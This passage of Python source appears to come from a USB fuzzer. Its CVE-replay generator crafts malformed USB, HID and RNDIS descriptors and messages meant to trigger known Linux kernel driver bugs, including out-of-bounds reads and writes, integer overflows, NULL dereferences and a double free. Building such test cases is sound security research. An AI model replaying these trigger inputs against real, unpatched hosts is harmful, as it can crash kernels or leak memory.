            0x09, 0x02, 0x32, 0x00, 0x02, 0x01, 0x00, 0x80, 0xFA,
            0x08, 0x0B, 0x00, 0x02, 0x0E, 0x03, 0x00, 0x00,
            0x09, 0x04, 0x00, 0x00, 0x00, 0x0E, 0x01, 0x01, 0x00,
            # VC Header — 注意 terminal ID=0
            0x0D, 0x24, 0x01, 0x40, 0x00, 0x30, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x01, 0x01,
            # Input Terminal — bTerminalID=0 (CVE触发点)
            0x11, 0x24, 0x02, 0x00,  # ← entity ID=0
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00,
            # Video Streaming Interface
            0x09, 0x04, 0x01, 0x00, 0x00, 0x0E, 0x02, 0x00, 0x00,
        ])
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2025-40016: UVC invalid entity ID — bTerminalID=0",
            device_descriptor=_desc(cls=0x0E),
            config_descriptor=bytes(uvc_bad_entity),
            source_ref="drivers/media/usb/uvc/uvc_driver.c → entity registration / UVC 1.1 §3.7.2",
            tags=["cve", "CVE-2025-40016", "uvc", "entity_id_zero"],
        ))

        # CVE-2024-53104: UVC truncated frame descriptor
        uvc_trunc_frame = bytearray([
            0x09, 0x02, 0x36, 0x00, 0x02, 0x01, 0x00, 0x80, 0xFA,
            0x08, 0x0B, 0x00, 0x02, 0x0E, 0x03, 0x00, 0x00,
            0x09, 0x04, 0x00, 0x00, 0x00, 0x0E, 0x01, 0x01, 0x00,
            0x0D, 0x24, 0x01, 0x40, 0x00, 0x30, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x02, 0x01,
            0x09, 0x04, 0x01, 0x00, 0x00, 0x0E, 0x02, 0x00, 0x00,
            # VS Header
            0x0E, 0x24, 0x01, 0x01, 0x0F, 0x00, 0x82, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            # VS Format
            0x0B, 0x24, 0x04, 0x01, 0x01, 0x59, 0x55, 0x59, 0x56, 0x00, 0x00,
            # Truncated Frame descriptor — bLength=0x0B but should be 0x1E (30)
            0x0B, 0x24, 0x05, 0x01, 0x80, 0x02, 0xE0, 0x01, 0x00, 0x00, 0x3C,
        ])
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2024-53104: UVC truncated frame descriptor — bLength=11 instead of 30",
            device_descriptor=_desc(cls=0x0E),
            config_descriptor=bytes(uvc_trunc_frame),
            source_ref="drivers/media/usb/uvc/uvc_driver.c → uvc_parse_format()",
            tags=["cve", "CVE-2024-53104", "uvc", "truncated", "frame_desc"],
        ))

        # ═══════════════════════════════════════════════════════════════
        # E. USB Audio CVE
        # ═══════════════════════════════════════════════════════════════

        # CVE-2017-16529: snd_usb_create_streams OOB — IAD 引用越界接口
        audio_iad_bad = bytearray([
            0x09, 0x02, 0x20, 0x00, 0x01, 0x01, 0x00, 0x80, 0x32,
            # IAD: bFirstInterface=0, bInterfaceCount=5 (但只有 1 个接口)
            0x08, 0x0B, 0x00, 0x05, 0x01, 0x03, 0x00, 0x00,
            0x09, 0x04, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
        ])
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16529: snd_usb_create_streams OOB — IAD bInterfaceCount=5 但仅 1 接口",
            device_descriptor=_desc(cls=0x01),  # Audio
            config_descriptor=bytes(audio_iad_bad),
            source_ref="sound/usb/card.c → snd_usb_create_streams() → IAD bFirstInterface+bInterfaceCount",
            tags=["cve", "CVE-2017-16529", "audio", "oob_read", "iad"],
        ))

        # CVE-2016-2184: snd-usb-audio NULL deref — bNumEndpoints=0
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2016-2184: snd-usb-audio NULL deref — bNumEndpoints=0 (无端点)",
            device_descriptor=_desc(vid=0x04FA, pid=0x4201, cls=0x01),
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=0, if_cls=0x01),
            source_ref="sound/usb/quirks.c → create_fixed_stream_quirk() → endpoint index",
            tags=["cve", "CVE-2016-2184", "audio", "null_deref", "zero_endpoints"],
        ))

        # CVE-2025-40275: UAC3 BADD NULL IAD — UAC3 device without IAD
        uac3_no_iad = bytearray([
            0x09, 0x02, 0x12, 0x00, 0x01, 0x01, 0x00, 0x80, 0x32,
            # Audio interface with UAC3 — no IAD!
            0x09, 0x04, 0x00, 0x00, 0x00, 0x01, 0x01, 0x03, 0x00,  # bcdADC=0x0300 (UAC3)
        ])
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2025-40275: UAC3 BADD NULL deref — UAC3 device without IAD",
            device_descriptor=_desc(bcd=0x0300, cls=0x01),  # USB 3.0 + Audio
            config_descriptor=bytes(uac3_no_iad),
            source_ref="sound/usb/mixer.c → snd_usb_mixer_controls_badd() → NULL IAD",
            tags=["cve", "CVE-2025-40275", "audio", "uac3", "null_deref"],
        ))

        # CVE-2022-48701: snd_usb_parse_audio_interface OOB — VID 0x04FA PID 0x4201
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2022-48701: snd_usb_parse_audio_interface OOB — 0x04FA:0x4201 with < 4 interfaces",
            device_descriptor=_desc(vid=0x04FA, pid=0x4201, cls=0x01),
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=0, if_cls=0x01),
            source_ref="sound/usb/stream.c → __snd_usb_parse_audio_interface() → usb_id table index",
            tags=["cve", "CVE-2022-48701", "audio", "oob_read", "vid_quirk"],
        ))

        # ═══════════════════════════════════════════════════════════════
        # F. RNDIS / 网络设备 CVE
        # ═══════════════════════════════════════════════════════════════

        # CVE-2022-48837: RNDIS integer overflow — BufOffset=0xFFFFFFF8
        rndis_overflow = struct.pack('<IIIIIIII',
            0x00000005,  # RNDIS_MSG_SET
            32,          # MsgLength
            1,           # RequestId
            0x00010101,  # OID
            0xFFFFFFF8,  # BufOffset ← integer overflow trigger
            8,           # BufLength
            0xDEADBEEF,  # data
            0xCAFEBABE,  # data
        )
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2022-48837: RNDIS gadget integer overflow — BufOffset=0xFFFFFFF8 → BufOffset+8 wraps to 0",
            device_descriptor=_desc(vid=0x0525, pid=0xA4A2, cls=0xEF),  # RNDIS gadget VID/PID
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0xEF,
                                            ep_types=[(3, 8)]),
            ep_data_override={0x81: rndis_overflow},
            source_ref="drivers/usb/gadget/function/rndis.c → rndis_set_response() → BufOffset+8",
            tags=["cve", "CVE-2022-48837", "rndis", "integer_overflow"],
        ))

        # CVE-2023-54110: rndis_host query integer overflow — DataOffset + DataLength overflow
        rndis_query_overflow = struct.pack('<IIIIIIII',
            0x80000004,  # RNDIS_MSG_QUERY_C (response)
            32,          # MsgLength
            1,           # RequestId
            0x00010101,  # OID
            0x80000000,  # DataOffset ← overflows with DataLength
            0x80000000,  # DataLength ← 0x80000000 + 0x80000000 = overflow
            0,           # Status
            0,
        )
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2023-54110: rndis_host query overflow — DataOffset+DataLength > 32-bit",
            device_descriptor=_desc(vid=0x0525, pid=0xA4A2, cls=0xEF),
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0xEF,
                                            ep_types=[(3, 8)]),
            ep_data_override={0x81: rndis_query_overflow},
            source_ref="drivers/net/usb/rndis_host.c → rndis_query() → off+len overflow",
            tags=["cve", "CVE-2023-54110", "rndis", "integer_overflow", "host_side"],
        ))

        # CVE-2022-25375: RNDIS info leak — BufOffset 越界读取内核内存
        rndis_leak = struct.pack('<IIIIIIII',
            0x00000005,  # RNDIS_MSG_SET
            32,          # MsgLength
            1,           # RequestId
            0x00010101,  # OID
            0x00001000,  # BufOffset ← large offset, read past buffer
            0x100,       # BufLength
            0x41414141, 0x42424242,
        )
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2022-25375: RNDIS gadget info leak — BufOffset=0x1000 reads kernel memory",
            device_descriptor=_desc(vid=0x0525, pid=0xA4A2, cls=0xEF),
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0xEF,
                                            ep_types=[(3, 8)]),
            ep_data_override={0x81: rndis_leak},
            source_ref="drivers/usb/gadget/function/rndis.c → RNDIS_MSG_SET handler",
            tags=["cve", "CVE-2022-25375", "rndis", "info_leak"],
        ))

        # ═══════════════════════════════════════════════════════════════
        # G. USB 串口 / 输入设备 CVE (VID/PID 特定)
        # ═══════════════════════════════════════════════════════════════

        # CVE-2017-16530: UAS OOB — 缺少 4 个必需端点
        uas_missing = bytearray()
        uas_missing += struct.pack('<BBHBBBBB', 9, 2, 16, 1, 1, 0, 0x80, 50)
        uas_missing += struct.pack('<BBBBBBBBB', 9, 4, 0, 0, 1, 0x08, 0x62, 0x00, 0x00)  # UAS class
        uas_missing += struct.pack('<BBBBHB', 7, 5, 0x81, 0x02, 512, 0)  # bulk EP, wMaxPacketSize=512
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16530: UAS OOB Read — UAS interface 只有 1 个端点 (需要 4: cmd/status/data-in/out)",
            device_descriptor=_desc(vid=0x152D, pid=0x0578, cls=0x08),  # JMicron UAS
            config_descriptor=bytes(uas_missing),
            source_ref="drivers/usb/storage/uas-detect.h → uas_find_endpoint() loop",
            tags=["cve", "CVE-2017-16530", "uas", "oob_read", "missing_endpoints"],
        ))

        # CVE-2017-15102: legousbtower write-what-where — partial init failure
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-15102: LEGO USB Tower write-what-where — partial init failure",
            device_descriptor=_desc(vid=0x0694, pid=0x0001),  # LEGO VID/PID
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=0, if_cls=0x00),  # 无端点触发失败
            source_ref="drivers/usb/misc/legousbtower.c → tower_probe() error path",
            tags=["cve", "CVE-2017-15102", "write_what_where", "legousbtower"],
        ))

        # CVE-2019-13631: GTCO HID OOB write — 超大 report descriptor
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2019-13631: GTCO tablet OOB write — 超大 HID report descriptor",
            device_descriptor=_desc(vid=0x078C, pid=0x0010),  # GTCO CalComp
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x03,
                                            ep_types=[(3, 64)]),
            hid_report_descriptor=b'\x05\x0D' * 500,  # 巨型 report descriptor
            source_ref="drivers/input/tablet/gtco.c → parse_hid_report_descriptor() debug buffer",
            tags=["cve", "CVE-2019-13631", "gtco", "oob_write"],
        ))

        # CVE-2017-16643: GTCO OOB read — report_size/report_count 极端值
        gtco_extreme = bytes([
            0x05, 0x0D, 0x09, 0x02, 0xA1, 0x01,
            0x15, 0x00, 0x27, 0xFF, 0xFF, 0x00, 0x00,  # Logical Max 0xFFFF
            0x75, 0xFF,  # Report Size 255
            0x96, 0xFF, 0xFF,  # Report Count 65535
            0x81, 0x02,
            0xC0,
        ])
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16643: GTCO OOB read — report_size=255 × report_count=65535",
            device_descriptor=_desc(vid=0x078C, pid=0x0010),
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x03,
                                            ep_types=[(3, 8)]),
            hid_report_descriptor=gtco_extreme,
            source_ref="drivers/input/tablet/gtco.c → parse_hid_report_descriptor() global items",
            tags=["cve", "CVE-2017-16643", "gtco", "oob_read", "extreme_values"],
        ))

        # CVE-2017-16647: ASIX net device NULL deref — 缺少 bulk endpoints
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16647: ASIX AX88179 NULL deref — 缺少 bulk-in/out endpoints",
            device_descriptor=_desc(vid=0x0B95, pid=0x1790),  # AX88179
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=0, if_cls=0xFF),  # 无端点
            source_ref="drivers/net/usb/asix_devices.c → ax88179_bind() → endpoint access",
            tags=["cve", "CVE-2017-16647", "asix", "null_deref", "zero_endpoints"],
        ))

        # CVE-2017-16645: IMS PCU CDC Union OOB — bSlaveInterface0=0xFF
        ims_bad_union = bytearray()
        ims_bad_union += struct.pack('<BBHBBBBB', 9, 2, 27, 1, 1, 0, 0x80, 50)
        ims_bad_union += struct.pack('<BBBBBBBBB', 9, 4, 0, 0, 1, 0x02, 0x00, 0x00, 0)
        ims_bad_union += struct.pack('<BBBBBBB', 7, 5, 0x82, 0x02, 64, 0, 0)
        # CDC Union descriptor with invalid interface references
        ims_bad_union += bytes([0x06, 0x24, 0x06, 0xFF, 0xFF, 0x00])  # bMaster=0xFF bSlave=0xFF
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16645: IMS PCU CDC Union OOB — bSlaveInterface0=0xFF (255)",
            device_descriptor=_desc(vid=0x1937, pid=0x1000, cls=0x02),
            config_descriptor=bytes(ims_bad_union),
            source_ref="drivers/input/misc/ims-pcu.c → ims_pcu_get_cdc_union_desc() → interface index",
            tags=["cve", "CVE-2017-16645", "ims_pcu", "cdc_union", "oob_read"],
        ))

        # CVE-2006-2935: CDROM DVD BCA integer overflow — oversized BCA length
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2006-2935: CDROM DVD BCA buffer overflow — SCSI CD-ROM with oversized BCA length",
            device_descriptor=_desc(vid=0x058F, pid=0x6387, cls=0x08),  # Generic USB CD-ROM
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=2, if_cls=0x08,
                                            ep_types=[(0x02, 512), (0x02, 512)]),
            ep_data_override={0x82: b'\x00' * 4096},  # oversized bulk-in
            source_ref="drivers/cdrom/cdrom.c → dvd_read_bca() → length field",
            tags=["cve", "CVE-2006-2935", "cdrom", "buffer_overflow"],
        ))

        # CVE-2017-16536: cx231xx USB video NULL deref — missing endpoints
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16536: cx231xx USB video NULL deref — 缺少 video streaming endpoints",
            device_descriptor=_desc(vid=0x1F28, pid=0x0041),  # Conexant cx231xx
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=0, if_cls=0xFF),
            source_ref="drivers/media/usb/cx231xx/cx231xx-cards.c → cx231xx_usb_probe()",
            tags=["cve", "CVE-2017-16536", "cx231xx", "null_deref"],
        ))

        # CVE-2019-15504: rsi_91x_usb double free
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2019-15504: RSI USB WiFi double free — bulk URB error path",
            device_descriptor=_desc(vid=0x0483, pid=0xC016),  # RSI SDIO/WiFi
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0xFF,
                                            ep_types=[(0x02, 512)]),
            ep_data_override={0x82: b'\xDE\xAD' * 256},  # trigger error path
            source_ref="drivers/net/wireless/rsi/rsi_91x_usb.c → rsi_rx_urb_completion()",
            tags=["cve", "CVE-2019-15504", "rsi", "double_free"],
        ))

        # CVE-2021-43976: mwifiex USB skb_over_panic — oversized packets
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2021-43976: mwifiex USB skb overflow — 超大 bulk-in packet (16KB+)",
            device_descriptor=_desc(vid=0x1286, pid=0x2042),  # Marvell mwifiex
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0xFF,
                                            ep_types=[(0x02, 512)]),
            ep_data_override={0x82: b'\x41' * 16384},  # 16KB oversized
            source_ref="drivers/net/wireless/marvell/mwifiex/usb.c → mwifiex_usb_recv()",
            tags=["cve", "CVE-2021-43976", "mwifiex", "skb_overflow"],
        ))

        # CVE-2017-8924: io_ti serial info leak — short bulk-in data
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-8924: Edgeport serial info leak — 短 bulk-in (3 字节)",
            device_descriptor=_desc(vid=0x1601, pid=0x001C),  # Inside Out Edgeport
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0xFF,
                                            ep_types=[(0x02, 64)]),
            ep_data_override={0x82: b'\x00\x00\x01'},  # 3 bytes, uninitialized read
            source_ref="drivers/usb/serial/io_ti.c → edge_bulk_in_callback()",
            tags=["cve", "CVE-2017-8924", "edgeport", "info_leak"],
        ))

        # CVE-2017-16528: ALSA seq_device UAF — USB-MIDI rapid disconnect
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16528: USB-MIDI UAF — class=0x01 sub=0x03 (MIDI streaming)",
            device_descriptor=_desc(cls=0x01, sub=0x03),
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x01,
                                            ep_types=[(0x02, 64)]),
            source_ref="sound/core/seq_device.c → snd_rawmidi_dev_seq_free()",
            tags=["cve", "CVE-2017-16528", "usb_midi", "uaf"],
        ))

        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # 全量生成
    # ═══════════════════════════════════════════════════════════════════════

    def generate_all(self, max_per_phase: int = 30) -> dict[FuzzPhase, list[FuzzCase]]:
        """生成所有阶段的用例"""
        generators = {
            FuzzPhase.DESCRIPTOR:     self.gen_descriptor_cases,
            FuzzPhase.CONTROL:        self.gen_control_cases,
            FuzzPhase.ENUMERATION:    self.gen_enumeration_cases,
            FuzzPhase.DATA_TRANSFER:  self.gen_data_transfer_cases,
            FuzzPhase.TIMING:         self.gen_timing_cases,
            FuzzPhase.HID_REPORT:     self.gen_hid_report_cases,
            FuzzPhase.CLASS_SPECIFIC: self.gen_class_specific_cases,
            FuzzPhase.MOBILE_SPECIFIC:   self.gen_mobile_specific_cases,
            # 深度协议模糊阶段
            FuzzPhase.HID_DEEP:       self.gen_hid_deep_cases,
            FuzzPhase.MSC_DEEP:       self.gen_msc_deep_cases,
            FuzzPhase.CDC_DEEP:       self.gen_cdc_deep_cases,
            FuzzPhase.UVC_DEEP:       self.gen_uvc_deep_cases,
            FuzzPhase.AUDIO_DEEP:     self.gen_audio_deep_cases,
            FuzzPhase.RNDIS_DEEP:     self.gen_rndis_deep_cases,
            FuzzPhase.CVE_REPLAY:     self.gen_cve_replay_cases,
        }
        result = {}
        for phase, gen in generators.items():
            cap = 60 if phase == FuzzPhase.CVE_REPLAY else max_per_phase
            result[phase] = gen(max_cases=cap)
        return result
